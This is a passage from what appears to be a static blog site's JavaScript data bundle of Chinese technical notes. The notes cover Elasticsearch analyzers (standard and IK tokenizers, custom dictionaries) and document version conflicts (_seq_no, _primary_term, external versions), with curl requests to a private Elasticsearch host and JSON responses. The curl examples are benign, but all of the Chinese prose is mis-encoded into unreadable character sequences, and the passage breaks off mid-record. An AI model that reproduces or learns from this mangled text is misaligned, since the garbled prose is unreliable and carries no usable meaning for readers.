¶æ¬¡ï¼å­ç¬¦ä¸²è¢«åè¯å¨åä¸ºåä¸ªçè¯æ¡ãä¸ä¸ªç®åçåè¯å¨éå°ç©ºæ ¼åæ ç¹çæ¶åï¼å¯è½ä¼å°ææ¬æåæè¯æ¡ã\n * token è¿æ»¤å¨\n   æåï¼è¯æ¡æé¡ºåºéè¿æ¯ä¸ª token è¿æ»¤å¨ãè¿ä¸ªè¿ç¨å¯è½ä¼æ¹åè¯æ¡ï¼ä¾å¦ï¼å°åå quickï¼ï¼å é¤è¯æ¡ï¼ä¾å¦ï¼å aï¼andï¼the ç­æ ç¨è¯ï¼ï¼æèå¢å è¯æ¡ï¼ä¾å¦ï¼å jump å leap è¿ç§åä¹è¯ï¼\n\n\n# åç½®åæå¨\n\nelasticsearch è¿éå¸¦äºå¯ä»¥ç´æ¥ä½¿ç¨çé¢åè£çåæå¨ãæ¥ä¸æ¥æä»¬ä¼ååºæéè¦çåæå¨ï¼\n\n * æ ååæå¨\n   æ ååæå¨æ¯ elasticsearch é»è®¤ä½¿ç¨çåæå¨ãå®æ¯åæåç§è¯­è¨ææ¬æå¸¸ç¨çéæ©ãä»æ ¹æ® unicode èçå®ä¹çåè¯è¾¹çååææ¬ãå é¤ç»å¤§é¨åæ ç¹ãæåï¼å°ç»æ¡å°åã\n * ç®ååæå¨\n   ç®ååæå¨å¨ä»»ä½ä¸æ¯å­æ¯çå°æ¹åå²ææ¬ï¼å°è¯æ¡å°åã\n * ç©ºæ ¼åæå¨\n   ç©ºæ ¼åæå¨å¨ç©ºæ ¼çå°æ¹åææ¬ã\n * è¯­è¨åæå¨\n   ç¹å®è¯­è¨åæå¨å¯ç¨äºå¾å¤è¯­ãä»ä»¬å¯ä»¥èèæå®è¯­è¨çç¹ç¹ãä¾å¦ï¼è±è¯­åæå¨éå¸¦äºä¸ç»è±è¯­æ ç¨è¯ï¼å¸¸ç¨åè¯ï¼ä¾å¦ and æè theï¼ä»ä»¬å¯¹ç¸å³æ§æ²¡æå¤å°å½±åï¼ï¼ä»ä»¬ä¼è¢«å é¤ãç±äºçè§£è±è¯­è¯­æ³çè§åï¼è¿ä¸ªåè¯å¨å¯ä»¥æåè±è¯­åè¯çè¯å¹²ã\n\n\n# æµè¯åæå¨\n\næ ååæå¨\n\ncurl --location --request get \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "analyzer":"standard",\n    "text": "text to analyzer"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "text", // token åè§£åçè¯æ¡\n            "start_offset": 0, // åç§»é\n            "end_offset": 4,\n            "type": "<alphanum>",\n            "position": 0 // ä½ç½®\n        },\n        {\n            "token": "to",\n            "start_offset": 5,\n            "end_offset": 7,\n            "type": "<alphanum>",\n            "position": 1\n        },\n        {\n            "token": "analyzer",\n            "start_offset": 8,\n            "end_offset": 16,\n            "type": "<alphanum>",\n            "position": 2\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\nik åè¯å¨ï¼è¿æ¬¾åè¯å¨æ¯ es èªå¸¦ï¼å¹¶ä¸æ¯çæ³çé£ä¹å¥½\n\ncurl --location --request get \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "text": "æµè¯ç¨ä¾"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "æµ",\n            "start_offset": 0,\n            "end_offset": 1,\n            "type": "<ideographic>",\n            "position": 0\n        },\n        {\n            "token": "è¯",\n            "start_offset": 1,\n            "end_offset": 2,\n            "type": "<ideographic>",\n            "position": 1\n        },\n        {\n            "token": "ç¨",\n            "start_offset": 2,\n            "end_offset": 3,\n            "type": "<ideographic>",\n            "position": 2\n        },\n        {\n            "token": "ä¾",\n            "start_offset": 3,\n            "end_offset": 4,\n            "type": "<ideographic>",\n            "position": 3\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\nè¿æ¬¾ ik åè¯å¨æ¯ä¸ä¸ªæä»¶ï¼æ¯è¾æ¨èçï¼ä»æä¸¤ç§åè¯å¨ï¼ä¸ç§æ¯ ik_max_wordï¼ä¼å°ææ¬åæç»ååº¦çæåï¼ä¸ç§æ¯ ik_smartï¼ä¼å°ææ¬åæç²ç²åº¦çæåãè¯¥åè¯å¨åªéè¦ä¸è½½è§£åå° es ç plugins æä»¶å¤¹ä¸ï¼å¹¶éå¯ es å³å¯ã\n\n# ik_max_word\ncurl --location --request get \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "analyzer":"ik_max_word",\n    "text": "æµè¯ç¨ä¾"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "æµè¯",\n            "start_offset": 0,\n            "end_offset": 2,\n            "type": "cn_word",\n            "position": 0\n        },\n        {\n            "token": "è¯ç¨",\n            "start_offset": 1,\n            "end_offset": 3,\n            "type": "cn_word",\n            "position": 1\n        },\n        {\n            "token": "ä¾",\n            "start_offset": 3,\n            "end_offset": 4,\n            "type": "cn_char",\n            "position": 2\n        }\n    ]\n}\n\n# ik_smart\ncurl --location --request get \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "analyzer":"ik_smart",\n    "text": "æµè¯ç¨ä¾"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "æµ",\n            "start_offset": 0,\n            "end_offset": 1,\n            "type": "cn_char",\n            "position": 0\n        },\n        {\n            "token": "è¯ç¨",\n            "start_offset": 1,\n            "end_offset": 3,\n            "type": "cn_word",\n            "position": 1\n        },\n        {\n            "token": "ä¾",\n            "start_offset": 3,\n            "end_offset": 4,\n            "type": "cn_char",\n            "position": 2\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\nes ä¸­ä¹å¯ä»¥è¿è¡æ©å±è¯æ±ï¼é¦åè¿å¥ es æ ¹ç®å½ä¸­ç plugins ç ik æä»¶å¤¹ä¸ï¼è¿å¥ config ç®å½ï¼åå»º custom.dic æä»¶ï¼åå¥å³é®è¯ãä¹åæå¼ ikanalyzer.cfg.xml æä»¶ï¼å°æ°å»ºç custom.dic éç½®å¶ä¸­ï¼éå¯ es æå¡å¨ã\nå¦ï¼å¼ ä¸å¥\n\n# åå»º custom.dic æä»¶ï¼é®å¥å³é®è¯ï¼å¹¶ä¿å­éåº\n# å¨ ikanalyzer.cfg.xml æå®æä»¶\n<entry key="ext_dict">custom.dic</entry>\n\n\n1\n2\n3\n\n\næµè¯\n\n# éç½®ä¹å\ncurl --location --request get \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "analyzer":"ik_max_word",\n    "text": "å¼ ä¸å¥"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "å¼ ",\n            "start_offset": 0,\n            "end_offset": 1,\n            "type": "cn_char",\n            "position": 0\n        },\n        {\n            "token": "ä¸",\n            "start_offset": 1,\n            "end_offset": 2,\n            "type": "type_cnum",\n            "position": 1\n        },\n        {\n            "token": "å¥",\n            "start_offset": 2,\n            "end_offset": 3,\n            "type": "cn_char",\n            "position": 2\n        }\n    ]\n}\n\n# èªå®ä¹å\n{\n    "tokens": [\n        {\n            "token": "å¼ ä¸å¥",\n            "start_offset": 0,\n            "end_offset": 3,\n            "type": "cn_word",\n            "position": 0\n        },\n        {\n            "token": "ä¸",\n            "start_offset": 1,\n            "end_offset": 2,\n            "type": "type_cnum",\n            "position": 1\n        },\n        {\n            "token": "å¥",\n            "start_offset": 2,\n            "end_offset": 3,\n            "type": "cn_char",\n            "position": 2\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n',charsets:{cjk:!0}},{title:"ES 7.8.0ï¼ä¸ï¼ ææ¡£å²çª",frontmatter:{title:"ES 7.8.0ï¼ä¸ï¼ ææ¡£å²çª",date:"2023-06-25T09:22:36.000Z",permalink:"/es/1802",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/05.Elasticsearch/1802.ES%207.8.0%EF%BC%88%E4%B8%89%EF%BC%89%20%E6%96%87%E6%A1%A3%E5%86%B2%E7%AA%81.html",relativePath:"02.ä¸­é´ä»¶/05.Elasticsearch/1802.ES 7.8.0ï¼ä¸ï¼ ææ¡£å²çª.md",key:"v-4fb47c6c",path:"/es/1802/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'ææ¡£å²çªå°±æ¯ä½ å¨è®¿é®ä¸ä¸ªææ¡£çæ¶åï¼å«äººä¹å¨è®¿é®è¿ä¸ªææ¡£ï¼æ­£å¸¸æ¥è¯´ææ¡£çæç»çæ¬ï¼åºè¯¥æ¯æåä¸ä¸ªä¿®æ¹çäººï¼èä¸è¿ç§æ¹å¼åªéåç¨äºå¨éä¿®æ¹ï¼ä½æ¯å¦æææ¯å±é¨ä¿®æ¹ï¼å°±ä¼é ææåé¢ä¿®æ¹ææ¡£çåå®¹ä¹è¦çæï¼è¿å°±æ¯ææ¡£å²çªã\n\nè§£å³è¿ç§ææ¡£å²çªçæ¹å¼ï¼å¨æ°æ®åºé¢åä¸­æä¸¤ç§æ¹å¼ç¨æ¥ç¡®ä¿å¹¶åæ´æ°æ¶åæ´ä¸ä¼ä¸¢å¤±ï¼\n\n * æ²è§é\n   è¿ç§æ¹å¼è¢«å³ç³»åæ°æ®åºå¹¿æ³ä½¿ç¨ï¼ä»åå®æåæ´å²çªå¯è½åçï¼å æ­¤é»å¡è®¿é®èµæºä»¥é²æ­¢å²çªãä¸ä¸ªå¸åçä¾å­æ¯è¯»åä¸è¡æ°æ®ä¹ååå°å¶éä½ï¼ç¡®ä¿åªææ¹å¼éççº¿ç¨è½å¤å¯¹è¿è¡æ°æ®è¿è¡ä¿®æ¹ã\n * ä¹è§é\n   ES ä¸­ä½¿ç¨çè¿ç§æ¹æ³ï¼åå®å²çªæ¶ä¸å¯è½åççï¼å¹¶ä¸ä¸ä¼é»å¡æ­£å¨å°è¯çæä½ãç¶èï¼å¦ææ°æ®å¨è¯»åå½ä¸­è¢«ä¿®æ¹ï¼æ´æ°å°ä¼å¤±è´¥ãåºç¨ç¨åºæ¥ä¸æ¥å³å®è¯¥å¦ä½è§£å³å²çªãä¾å¦ï¼å¯ä»¥éè¯æ´æ°ï¼ä½¿ç¨æ°çæ°æ®ï¼æèå°ç¸å³æåµæ¥åç»ç¨æ·ã\n\nES æ¯åå¸å¼çï¼å½ææ¡£åå»ºãæ´æ°åå é¤æ¶ï¼æ°çæ¬çææ¡£å¿é¡»å¤å¶å°éç¾¤ä¸­çå¶ä»èç¹ãES ä¹æ¯å¼æ­¥åå¹¶åçï¼è¿æå³çè¿äºå¤å¶è¯·æ±è¢«å¹¶è¡åéï¼å¹¶ä¸è¾¾å°ç®çæ¶ä¹è®¸é¡ºåºæ¯ä¹±çãES éè¦ä¸ç§æ¹æ³ç¡®ä¿ææ¡£çæ§çæ¬ä¸ä¼è¦çæ°ççæ¬ã\n\næ¯ä¸ªææ¡£é½æä¸ä¸ª_versionï¼çæ¬ï¼å·ï¼å½ææ¡£è¢«ä¿®æ¹æ¶çæ¬å·éå¢ãES ä½¿ç¨è¿ä¸ª version å·æ¥ç¡®ä¿åæ´ä»¥æ­£ç¡®é¡ºåºå¾å°æ§è¡ãå¦ææ§çæ¬çææ¡£å¨æ°çæ¬ä¹åå°è¾¾ï¼å®å¯ä»¥è¢«ç®åçå¿½ç¥ã\n\nä»¥ä¸æ¼ç¤º ES å¯¹äºçæ¬å·çä½¿ç¨\n\n# æ¥è¯¢æ°æ®\ncurl --location --request GET \'http://10.240.30.93:9200/user/_doc/l76GEIEBBfzVdzdvUxQl\'\n\n{\n    "_index": "user",\n    "_type": "_doc",\n    "_id": "l76GEIEBBfzVdzdvUxQl",\n    "_version": 1, // é»è®¤çæ¬\n    "_seq_no": 0, // åºåå·\n    "_primary_term": 3,\n    "found": true,\n    "_source": {\n        "name": "zhangsan"\n    }\n}\n\n# ä¿®æ¹æ°æ®\ncurl --location --request POST \'http://10.240.30.93:9200/user/_update/l76GEIEBBfzVdzdvUxQl\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "doc":{\n        "name": "zhangsan1"\n    }\n}\'\n\n{\n    "_index": "user",\n    "_type": "_doc",\n    "_id": "l76GEIEBBfzVdzdvUxQl",\n    "_version": 2, // çæ¬éå¢\n    "result": "updated",\n    "_shards": {\n        "total": 3,\n        "successful": 1,\n        "failed": 0\n    },\n    "_seq_no": 1, // åºåå·ä¹å¢å äº\n    "_primary_term": 3 // ä¸»åçæ¬¡æ°\n}\n\n# å¦æéå¯¹ä»¥ä¸æå¹¶åä¿®æ¹ï¼é½ä¿®æ¹nameå­æ®µï¼æä»¬å¯ä»¥æå® if_seq_no å if_primary_term ä¿®æ¹\ncurl --location --request POST \'http://10.240.30.93:9200/user/_update/l76GEIEBBfzVdzdvUxQl?if_seq_no=1&if_primary_term=3\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "doc":{\n        "name": "zhangsan2"\n    }\n}\'\n\n# å½ç¶æä»¬ä¹å¯ä»¥æå®ä»ççæ¬ï¼ä½æ¯versionçå¼ä¸å®è¦æ¯åå¼é«\ncurl --location --request POST \'http://10.240.30.93:9200/user/_doc/l76GEIEBBfzVdzdvUxQl?version=4&version_type=external\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "name": "zhangsan2"\n}\'\n\n{\n    "_index": "user",\n    "_type": "_doc",\n    "_id": "l76GEIEBBfzVdzdvUxQl",\n    "_version": 4,\n    "result": "updated",\n    "_shards": {\n        "total": 3,\n        "successful": 1,\n        "failed": 0\n    },\n    "_seq_no": 3,\n    "_primary_term": 3\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n * _seq_no\n   âä¸¥æ ¼éå¢çé¡ºåºå·ï¼æ¯ä¸ªææ¡£ä¸ä¸ªï¼Shard çº§å«ä¸¥æ ¼éå¢ï¼ä¿è¯ååå¥ç Doc ç_seq_no å¤§äºååå¥ç Doc ç_seq_noã\n   âä»»ä½ç±»åçåæä½ï¼åæ¬ indexãcreateãupdate å Deleteï¼é½ä¼çæä¸ä¸ª_seq_noã\n   âæ¯ä¸ªææ¡£å¨ä½¿ç¨ Lucene ç document æä½æ¥å£ä¹åï¼ä¼è·åå°ä¸ä¸ª_seq_noï¼è¿ä¸ª_seq_no ä¼ä»¥ç³»ç»ä¿ç Field çåä¹å­å¨å° Lucene ä¸­ï¼ææ¡£åå¥ Lucene æååï¼ä¼æ è®°è¯¥ seq_no ä¸ºå®æç¶æï¼è¿æ¶åä¼ä½¿ç¨å½å seq_no æ´æ° local_checkpointã\n\n * _primary_term\n   â _primary_term ä¹å_seq_no ä¸æ ·æ¯ä¸ä¸ªæ´æ°ï¼æ¯å½ Primary Shard åçéæ°åéæ¶ï¼æ¯å¦éå¯ï¼Primary éä¸¾ç­ï¼_primary_term ä¼éå¢ 1ã\n   â_primary_term ä¸»è¦æ¯ç¨æ¥æ¢å¤æ°æ®æ¶å¤çå½å¤ä¸ªææ¡£ç_seq_no ä¸æ ·æ¶çå²çªï¼é¿å Primary Shard ä¸çåå¥è¢«è¦çã',normalizedContent:'ææ¡£å²çªå°±æ¯ä½ å¨è®¿é®ä¸ä¸ªææ¡£çæ¶åï¼å«äººä¹å¨è®¿é®è¿ä¸ªææ¡£ï¼æ­£å¸¸æ¥è¯´ææ¡£çæç»çæ¬ï¼åºè¯¥æ¯æåä¸ä¸ªä¿®æ¹çäººï¼èä¸è¿ç§æ¹å¼åªéåç¨äºå¨éä¿®æ¹ï¼ä½æ¯å¦æææ¯å±é¨ä¿®æ¹ï¼å°±ä¼é ææåé¢ä¿®æ¹ææ¡£çåå®¹ä¹è¦çæï¼è¿å°±æ¯ææ¡£å²çªã\n\nè§£å³è¿ç§ææ¡£å²çªçæ¹å¼ï¼å¨æ°æ®åºé¢åä¸­æä¸¤ç§æ¹å¼ç¨æ¥ç¡®ä¿å¹¶åæ´æ°æ¶åæ´ä¸ä¼ä¸¢å¤±ï¼\n\n * æ²è§é\n   è¿ç§æ¹å¼è¢«å³ç³»åæ°æ®åºå¹¿æ³ä½¿ç¨ï¼ä»åå®æåæ´å²çªå¯è½åçï¼å æ­¤é»å¡è®¿é®èµæºä»¥é²æ­¢å²çªãä¸ä¸ªå¸åçä¾å­æ¯è¯»åä¸è¡æ°æ®ä¹ååå°å¶éä½ï¼ç¡®ä¿åªææ¹å¼éççº¿ç¨è½å¤å¯¹è¿è¡æ°æ®è¿è¡ä¿®æ¹ã\n * ä¹è§é\n   es ä¸­ä½¿ç¨çè¿ç§æ¹æ³ï¼åå®å²çªæ¶ä¸å¯è½åççï¼å¹¶ä¸ä¸ä¼é»å¡æ­£å¨å°è¯çæä½ãç¶èï¼å¦ææ°æ®å¨è¯»åå½ä¸­è¢«ä¿®æ¹ï¼æ´æ°å°ä¼å¤±è´¥ãåºç¨ç¨åºæ¥ä¸æ¥å³å®è¯¥å¦ä½è§£å³å²çªãä¾å¦ï¼å¯ä»¥éè¯æ´æ°ï¼ä½¿ç¨æ°çæ°æ®ï¼æèå°ç¸å³æåµæ¥åç»ç¨æ·ã\n\nes æ¯åå¸å¼çï¼å½ææ¡£åå»ºãæ´æ°åå é¤æ¶ï¼æ°çæ¬çææ¡£å¿é¡»å¤å¶å°éç¾¤ä¸­çå¶ä»èç¹ães ä¹æ¯å¼æ­¥åå¹¶åçï¼è¿æå³çè¿äºå¤å¶è¯·æ±è¢«å¹¶è¡åéï¼å¹¶ä¸è¾¾å°ç®çæ¶ä¹è®¸é¡ºåºæ¯ä¹±çães éè¦ä¸ç§æ¹æ³ç¡®ä¿ææ¡£çæ§çæ¬ä¸ä¼è¦çæ°ççæ¬ã\n\næ¯ä¸ªææ¡£é½æä¸ä¸ª_versionï¼çæ¬ï¼å·ï¼å½ææ¡£è¢«ä¿®æ¹æ¶çæ¬å·éå¢ães ä½¿ç¨è¿ä¸ª version å·æ¥ç¡®ä¿åæ´ä»¥æ­£ç¡®é¡ºåºå¾å°æ§è¡ãå¦ææ§çæ¬çææ¡£å¨æ°çæ¬ä¹åå°è¾¾ï¼å®å¯ä»¥è¢«ç®åçå¿½ç¥ã\n\nä»¥ä¸æ¼ç¤º es å¯¹äºçæ¬å·çä½¿ç¨\n\n# æ¥è¯¢æ°æ®\ncurl --location --request get \'http://10.240.30.93:9200/user/_doc/l76geiebbfzvdzdvuxql\'\n\n{\n    "_index": "user",\n    "_type": "_doc",\n    "_id": "l76geiebbfzvdzdvuxql",\n    "_version": 1, // é»è®¤çæ¬\n    "_seq_no": 0, // åºåå·\n    "_primary_term": 3,\n    "found": true,\n    "_source": {\n        "name": "zhangsan"\n    }\n}\n\n# ä¿®æ¹æ°æ®\ncurl --location --request post \'http://10.240.30.93:9200/user/_update/l76geiebbfzvdzdvuxql\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "doc":{\n        "name": "zhangsan1"\n    }\n}\'\n\n{\n    "_index": "user",\n    "_type": "_doc",\n    "_id": "l76geiebbfzvdzdvuxql",\n    "_version": 2, // çæ¬éå¢\n    "result": "updated",\n    "_shards": {\n        "total": 3,\n        "successful": 1,\n        "failed": 0\n    },\n    "_seq_no": 1, // åºåå·ä¹å¢å äº\n    "_primary_term": 3 // ä¸»åçæ¬¡æ°\n}\n\n# å¦æéå¯¹ä»¥ä¸æå¹¶åä¿®æ¹ï¼é½ä¿®æ¹nameå­æ®µï¼æä»¬å¯ä»¥æå® if_seq_no å if_primary_term ä¿®æ¹\ncurl --location --request post \'http://10.240.30.93:9200/user/_update/l76geiebbfzvdzdvuxql?if_seq_no=1&if_primary_term=3\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "doc":{\n        "name": "zhangsan2"\n    }\n}\'\n\n# å½ç¶æä»¬ä¹å¯ä»¥æå®ä»ççæ¬ï¼ä½æ¯versionçå¼ä¸å®è¦æ¯åå¼é«\ncurl --location --request post \'http://10.240.30.93:9200/user/_doc/l76geiebbfzvdzdvuxql?version=4&version_type=external\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "name": "zhangsan2"\n}\'\n\n{\n    "_index": "user",\n    "_type": "_doc",\n    "_id": "l76geiebbfzvdzdvuxql",\n    "_version": 4,\n    "result": "updated",\n    "_shards": {\n        "total": 3,\n        "successful": 1,\n        "failed": 0\n    },\n    "_seq_no": 3,\n    "_primary_term": 3\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n * _seq_no\n   âä¸¥æ ¼éå¢çé¡ºåºå·ï¼æ¯ä¸ªææ¡£ä¸ä¸ªï¼shard çº§å«ä¸¥æ ¼éå¢ï¼ä¿è¯ååå¥ç doc ç_seq_no å¤§äºååå¥ç doc ç_seq_noã\n   âä»»ä½ç±»åçåæä½ï¼åæ¬ indexãcreateãupdate å deleteï¼é½ä¼çæä¸ä¸ª_seq_noã\n   âæ¯ä¸ªææ¡£å¨ä½¿ç¨ lucene ç document æä½æ¥å£ä¹åï¼ä¼è·åå°ä¸ä¸ª_seq_noï¼è¿ä¸ª_seq_no ä¼ä»¥ç³»ç»ä¿ç field çåä¹å­å¨å° lucene ä¸­ï¼ææ¡£åå¥ lucene æååï¼ä¼æ è®°è¯¥ seq_no ä¸ºå®æç¶æï¼è¿æ¶åä¼ä½¿ç¨å½å seq_no æ´æ° local_checkpointã\n\n * _primary_term\n   â _primary_term ä¹å_seq_no ä¸æ ·æ¯ä¸ä¸ªæ´æ°ï¼æ¯å½ primary shard åçéæ°åéæ¶ï¼æ¯å¦éå¯ï¼primary éä¸¾ç­ï¼_primary_term ä¼éå¢ 1ã\n   â_primary_term ä¸»è¦æ¯ç¨æ¥æ¢å¤æ°æ®æ¶å¤çå½å¤ä¸ªææ¡£ç_seq_no ä¸æ ·æ¶çå²çªï¼é¿å primary shard ä¸çåå¥è¢«è¦çã',charsets:{cjk:!0}},{title:"MySQL ç´¢å¼ä»ç»",frontmatter:{title:"MySQL ç´¢å¼ä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/mysql/1300",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/03.%E5%A4%A7%E6%95%B0%E6%8D%AE/04.mysql/1300.MySQL%20%E7%B4%A2%E5%BC%95%E4%BB%8B%E7%BB%8D.html",relativePath:"03.å¤§æ°æ®/04.mysql/1300.MySQL ç´¢å¼ä»ç».md",key:"v-1b92a67a",path:"/mysql/1300/",headers:[{level:2,title:"MySQLä¸­ç´¢å¼çè¯­æ³",slug:"mysqlä¸­ç´¢å¼çè¯­æ³",normalizedTitle:"mysql ä¸­ç´¢å¼çè¯­æ³",charIndex:2},{level:3,title:"åå»ºç´¢å¼",slug:"åå»ºç´¢å¼",normalizedTitle:"åå»ºç´¢å¼",charIndex:19},{level:3,title:"æ³¨æï¼",slug:"æ³¨æ",normalizedTitle:"æ³¨æï¼",charIndex:329},{level:3,title:"æ ¹æ®ç´¢å¼æ¥è¯¢",slug:"æ ¹æ®ç´¢å¼æ¥è¯¢",normalizedTitle:"æ ¹æ®ç´¢å¼æ¥è¯¢",charIndex:409},{level:3,title:"å é¤ç´¢å¼",slug:"å é¤ç´¢å¼",normalizedTitle:"å é¤ç´¢å¼",charIndex:1219},{level:3,title:"æ¥çè¡¨ä¸­çç´¢å¼",slug:"æ¥çè¡¨ä¸­çç´¢å¼",normalizedTitle:"æ¥çè¡¨ä¸­çç´¢å¼",charIndex:1323},{level:3,title:"æ¥çæ¥è¯¢è¯­å¥ä½¿ç¨ç´¢å¼çæåµ",slug:"æ¥çæ¥è¯¢è¯­å¥ä½¿ç¨ç´¢å¼çæåµ",normalizedTitle:"æ¥çæ¥è¯¢è¯­å¥ä½¿ç¨ç´¢å¼çæåµ",charIndex:1367},{level:2,title:"ç´¢å¼çä¼ç¼ºç¹",slug:"ç´¢å¼çä¼ç¼ºç¹",normalizedTitle:"ç´¢å¼çä¼ç¼ºç¹",charIndex:1464},{level:2,title:"ç´¢å¼çåç±»",slug:"ç´¢å¼çåç±»",normalizedTitle:"ç´¢å¼çåç±»",charIndex:1652},{level:3,title:"å¸¸è§çç´¢å¼ç±»åæï¼ä¸»é®ç´¢å¼ãå¯ä¸ç´¢å¼ãæ®éç´¢å¼ãå¨æç´¢å¼ãç»åç´¢å¼",slug:"å¸¸è§çç´¢å¼ç±»åæ-ä¸»é®ç´¢å¼ãå¯ä¸ç´¢å¼ãæ®éç´¢å¼ãå¨æç´¢å¼ãç»åç´¢å¼",normalizedTitle:"å¸¸è§çç´¢å¼ç±»åæï¼ä¸»é®ç´¢å¼ãå¯ä¸ç´¢å¼ãæ®éç´¢å¼ãå¨æç´¢å¼ãç»åç´¢å¼",charIndex:1662},{level:2,title:"ç´¢å¼çå®ç°åç",slug:"ç´¢å¼çå®ç°åç",normalizedTitle:"ç´¢å¼çå®ç°åç",charIndex:2498},{level:3,title:"åå¸ç´¢å¼ï¼",slug:"åå¸ç´¢å¼",normalizedTitle:"åå¸ç´¢å¼ï¼",charIndex:2600},{level:3,title:"å¨æç´¢å¼ï¼",slug:"å¨æç´¢å¼",normalizedTitle:"å¨æç´¢å¼ï¼",charIndex:1995},{level:3,title:"æ³¨æï¼",slug:"æ³¨æ-2",normalizedTitle:"æ³¨æï¼",charIndex:329},{level:3,title:"BTreeç´¢å¼åB+Treeç´¢å¼",slug:"btreeç´¢å¼åb-treeç´¢å¼",normalizedTitle:"btree ç´¢å¼å b+tree ç´¢å¼",charIndex:3825},{level:2,title:"ç´¢å¼çä½¿ç¨ç­ç¥",slug:"ç´¢å¼çä½¿ç¨ç­ç¥",normalizedTitle:"ç´¢å¼çä½¿ç¨ç­ç¥",charIndex:6937},{level:3,title:"ä»ä¹æ¶åè¦ä½¿ç¨ç´¢å¼ï¼",slug:"ä»ä¹æ¶åè¦ä½¿ç¨ç´¢å¼",normalizedTitle:"ä»ä¹æ¶åè¦ä½¿ç¨ç´¢å¼ï¼",charIndex:6949},{level:3,title:"ä»ä¹æ¶åä¸è¦ä½¿ç¨ç´¢å¼ï¼",slug:"ä»ä¹æ¶åä¸è¦ä½¿ç¨ç´¢å¼",normalizedTitle:"ä»ä¹æ¶åä¸è¦ä½¿ç¨ç´¢å¼ï¼",charIndex:7162},{level:3,title:"ç´¢å¼å¤±æçæåµï¼",slug:"ç´¢å¼å¤±æçæåµ",normalizedTitle:"ç´¢å¼å¤±æçæåµï¼",charIndex:7408},{level:2,title:"ç´¢å¼çä¼å",slug:"ç´¢å¼çä¼å",normalizedTitle:"ç´¢å¼çä¼å",charIndex:8314}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"MySQLä¸­ç´¢å¼çè¯­æ³ åå»ºç´¢å¼ æ³¨æï¼ æ ¹æ®ç´¢å¼æ¥è¯¢ å é¤ç´¢å¼ æ¥çè¡¨ä¸­çç´¢å¼ æ¥çæ¥è¯¢è¯­å¥ä½¿ç¨ç´¢å¼çæåµ ç´¢å¼çä¼ç¼ºç¹ ç´¢å¼çåç±» å¸¸è§çç´¢å¼ç±»åæï¼ä¸»é®ç´¢å¼ãå¯ä¸ç´¢å¼ãæ®éç´¢å¼ãå¨æç´¢å¼ãç»åç´¢å¼ ç´¢å¼çå®ç°åç åå¸ç´¢å¼ï¼ å¨æç´¢å¼ï¼ æ³¨æï¼ BTreeç´¢å¼åB+Treeç´¢å¼ ç´¢å¼çä½¿ç¨ç­ç¥ ä»ä¹æ¶åè¦ä½¿ç¨ç´¢å¼ï¼ ä»ä¹æ¶åä¸è¦ä½¿ç¨ç´¢å¼ï¼ ç´¢å¼å¤±æçæåµï¼ ç´¢å¼çä¼å",content:"# MySQL ä¸­ç´¢å¼çè¯­æ³\n\n\n# 